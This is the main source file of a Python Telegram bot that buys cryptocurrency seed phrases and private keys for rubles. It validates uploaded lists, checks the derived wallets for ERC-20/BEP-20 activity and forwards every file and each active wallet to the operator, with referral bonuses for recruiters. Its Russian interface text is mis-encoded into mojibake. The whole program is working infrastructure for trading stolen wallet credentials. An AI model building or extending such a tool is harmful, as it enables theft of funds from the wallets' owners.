# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="üìÇ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª", callback_data="upload")],
        [InlineKeyboardButton(text="üë§ –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")],
        [InlineKeyboardButton(text="üë• –†–µ—Ñ–µ—Ä–∞–ª—ã", callback_data="referrals")],
        [InlineKeyboardButton(text="üí∞ –ë–∞–ª–∞–Ω—Å", callback_data="balance")],
        [InlineKeyboardButton(text="üí≥ –í—ã–≤–µ—Å—Ç–∏", callback_data="withdraw")],
        [InlineKeyboardButton(text="üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data="support")],
        [InlineKeyboardButton(text="‚ÑπÔ∏è –ü—Ä–∞–≤–∏–ª–∞", callback_data="rules")],
    ]
)

admin_panel = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")],
        [InlineKeyboardButton(text="üì§ –ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥", callback_data="admin_withdrawals")],
        [InlineKeyboardButton(text="üîô –í—ã—Ö–æ–¥", callback_data="admin_logout")]
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1:
        payload = args[1]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.replace("ref_", ""))
            except:
                pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id:
        await register_referral(message.from_user.id, referrer_id)

    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
    text = (
        "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</b>\n\n"
        "üõí <b>–°–∫—É–ø–∫–∞ SEED-—Ñ—Ä–∞–∑ –∏ Private-–∫–ª—é—á–µ–π</b> —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏ –≤ —Å–µ—Ç—è—Ö:\n"
        "‚Ä¢ <b>ERC-20 (Ethereum)</b>\n"
        "‚Ä¢ <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "üí∞ <b>–¶–µ–Ω—ã:</b>\n"
        "‚Ä¢ üå± SEED-—Ñ—Ä–∞–∑–∞ ‚Äî <b>235‚ÇΩ</b>\n"
        "‚Ä¢ üîë Private-key ‚Äî <b>145‚ÇΩ</b>\n\n"
        "üí∏ <b>–ü–õ–ê–¢–ò–ú –°–ê–ú–£–Æ –í–´–°–û–ö–£–Æ –¶–ï–ù–£</b> + <b>70% –æ—Ç –æ—Ç—Ä–∞–±–æ—Ç–∫–∏</b> –ø–æ–º–∏–º–æ –ø—Ä–∞–π—Å–∞!\n\n"
        "üîù <b>–ù–∞—à–∏ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:</b>\n"
        "‚îú ü§ñ –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è\n"
        "‚îú ‚ö° –ë—ã—Å—Ç—Ä—ã–µ –≤—ã–ø–ª–∞—Ç—ã\n"
        "‚îú üöÄ –í—ã—Å–æ–∫–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å\n"
        "‚îî üîç –ì–ª—É–±–æ–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞\n\n"
        "üïí <b>–í—ã–ø–ª–∞—Ç—ã –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –≤ 23:00 (–ú–°–ö)</b>\n"
        "–í—Å–µ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
    )
    await message.answer(text, reply_markup=main_menu)

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "üìÇ –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª –≤ —Ñ–æ—Ä–º–∞—Ç–µ <b>.txt</b>.\n\n"
        "üìå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –¥–æ <b>20 –ú–ë</b>.\n"
        "üîç –ü—Ä–æ–≤–µ—Ä–∫–∞: —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å + –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å"
    )
    await state.set_state(UploadFile.waiting_file)
    await callback.answer()

@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    # –î–ª—è –∞–¥–º–∏–Ω–∞: —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤
    active_lines = []

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –∞–¥–º–∏–Ω—É
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
    try:
        await bot.send_message(ADMIN_ID, f"üì© –§–∞–π–ª –æ—Ç {user_info}\nüìÑ {document.file_name}")
        await bot.send_document(ADMIN_ID, document.file_id)
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª: {e}")

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è
    if not document.file_name.endswith(".txt"):
        await message.answer("‚ùå –§–∞–π–ª –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ <b>.txt</b>.")
        await state.clear()
        return

    msg = await message.answer("üì• –°–∫–∞—á–∏–≤–∞—é —Ñ–∞–π–ª...")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("‚ùå –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –ú–∞–∫—Å–∏–º—É–º ‚Äî 20 –ú–ë.")
            await state.clear()
            return

        file_data = (await bot.download_file(file.file_path)).getvalue()

        if len(file_data) >= 100 and b'\x00' in file_data[:100]:
            await message.answer("‚ùå –≠—Ç–æ –Ω–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª.")
            await state.clear()
            return

        try:
            content = file_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = file_data.decode("cp1251")
            except UnicodeDecodeError:
                content = file_data.decode("utf-8", errors="replace")

    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await message.answer("‚ùå –§–∞–π–ª –ø—É—Å—Ç.")
        await state.clear()
        return

    progress_msg = await message.answer(f"üîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å—Ç—Ä–æ–∫...\n‚úÖ –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: 0 / {total_lines} (0%)")

    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for i, line in enumerate(lines, 1):
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True
            active_lines.append(f"{address} | {wallet_type.upper()} | +{price}‚ÇΩ")

        if i % 5 == 0 or i == total_lines:
            percent = (i / total_lines) * 100
            try:
                await progress_msg.edit_text(
                    f"üîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å—Ç—Ä–æ–∫...\n"
                    f"‚úÖ –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {i} / {total_lines} ({int(percent)}%)"
                )
            except:
                pass

    if active_lines:
        filename = f"active_{message.from_user.id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("–ê–∫—Ç–∏–≤–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏ (–∞–¥—Ä–µ—Å | —Ç–∏–ø | –æ–ø–ª–∞—Ç–∞)\n")
            f.write("="*50 + "\n")
            f.write("\n".join(active_lines))
        try:
            await bot.send_message(ADMIN_ID, "‚úÖ –ù–∞–π–¥–µ–Ω—ã –∞–∫—Ç–∏–≤–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏:")
            await bot.send_document(ADMIN_ID, document=open(filename, "rb"))
            os.remove(filename)
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"‚ùå –û—à–∏–±–∫–∞: {e}")
    else:
        await bot.send_message(ADMIN_ID, "‚ùå –ê–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"üéâ –†–µ—Ñ–µ—Ä–∞–ª –∑–∞—Ä–∞–±–æ—Ç–∞–ª {total_reward}‚ÇΩ\nüí∏ –í–∞–º +{bonus:.2f}‚ÇΩ")
            except: pass

    if total_reward > 0:
        text = (
            f'‚úÖ –§–∞–π–ª <b>"{document.file_name}"</b> –æ–±—Ä–∞–±–æ—Ç–∞–Ω!\n\n'
            f"üìä –ù–∞–π–¥–µ–Ω–æ:\n"
            f"   ‚Ä¢ üå± SEED: <b>{new_seeds}</b> √ó 235‚ÇΩ\n"
            f"   ‚Ä¢ üîë Keys: <b>{new_keys}</b> √ó 145‚ÇΩ\n\n"
            f"üìà –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            f"üí∞ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'‚ö†Ô∏è –í —Ñ–∞–π–ª–µ <b>"{document.file_name}"</b> –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤.\n\n'
            f"üìà –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            "‚ùå –ë–∞–ª–∞–Ω—Å –Ω–µ –ø–æ–ø–æ–ª–Ω–µ–Ω."
        )

    try:
        await progress_msg.edit_text(text)
    except:
        await message.answer(text, reply_markup=main_menu)

    await state.clear()
